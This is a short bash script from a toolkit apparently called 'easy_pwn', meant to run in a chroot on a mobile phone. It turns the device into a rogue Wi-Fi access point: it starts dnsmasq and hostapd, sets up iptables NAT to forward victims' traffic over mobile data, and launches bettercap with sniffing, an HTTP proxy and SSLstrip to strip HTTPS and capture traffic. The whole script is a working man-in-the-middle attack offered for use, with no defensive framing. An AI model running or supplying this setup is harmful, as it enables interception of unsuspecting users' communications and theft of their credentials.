#!/bin/bash
# easy_pwn : rogue access point script

# load easy_pwn settings
. /mnt/easy_pwn/settings.sh

echo "(chroot) [!] WARNING: make sure your wifi is enabled in connman"
echo "             and not connected, also make sure your mobile data"
echo "             is turned on."

ip addr add 10.0.0.1/24 dev $WLAN_IF
sleep 1
 
# Start dnsmasq 
echo "(chroot) [-] starting dnsmasq dhcp server..."
if [ -z "$(ps -e | grep dnsmasq)" ]
then
	dnsmasq -C /mnt/easy_pwn/scripts/rogue_ap/dnsmasq.conf
fi

echo "(chroot) [-] forwarding $WLAN_IF traffic to mobile data..."

# flush iptables
iptables -F 
iptables -t nat -F

# allow in and out
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT

# start nat
iptables -t nat -A POSTROUTING -o $MOBILE_IF -j MASQUERADE
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $WLAN_IF -j ACCEPT # -o $MOBILE_IF

# enable ip forwarding
echo "(chroot) [-] enabling ip_forward..."
sysctl -w net.ipv4.ip_forward=1

# fix for xperia X (and compact)
echo 2 > /sys/module/bcmdhd/parameters/op_mode

# start hostpad
echo "(chroot) [-] starting hostapd..."
hostapd -i $WLAN_IF /mnt/easy_pwn/scripts/rogue_ap/hostapd.conf &
sleep 2

# start bettercap with webui, sniffer and http proxy with SSLstrip
echo "(chroot) [-] starting bettercap"
bettercap -caplet http-ui -iface $WLAN_IF --eval "net.sniff on;set http.proxy.sslstrip true;http.proxy on;"

# on exit flush iptables
iptables -F
iptables -t nat -F
echo "(chroot) done."